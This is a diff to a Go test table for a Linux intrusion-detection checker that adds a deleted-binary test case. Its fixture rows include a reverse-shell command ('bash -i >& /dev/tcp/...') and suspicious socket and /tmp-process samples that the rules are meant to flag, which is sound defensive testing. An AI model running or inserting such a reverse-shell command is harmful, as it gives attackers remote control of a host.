@@ -36,6 +36,7 @@ func TestLinuxCheckRules(t *testing.T) {
 		{"ps", `bash -i >& /dev/tcp/10.0.0.8/4444`, "shell-interactive"},
 		{"listen", `ESTAB 0 0 10.0.0.5:22 5.6.7.8:4444 users:(("python",pid=1234))`, "net-interpreter-socket-ss"},
 		{"deleted-exe", `/proc/1234/exe -> /tmp/.x (deleted)`, "deleted-binary"},
+		{"deleted-exe", `sleep 2686147 root 0r REG 0,36 4 0 21655 /tmp/karma-del-test (deleted)`, "deleted-binary"},
 		{"hidden-procs", `1234`, "proc-not-in-ps"},
 		{"cwd-tmp", `/proc/1234 -> /tmp/.x`, "proc-cwd-tmp"},
 		{"firewall", `-A INPUT -p tcp --dport 22 -j ACCEPT`, "firewall-active"},
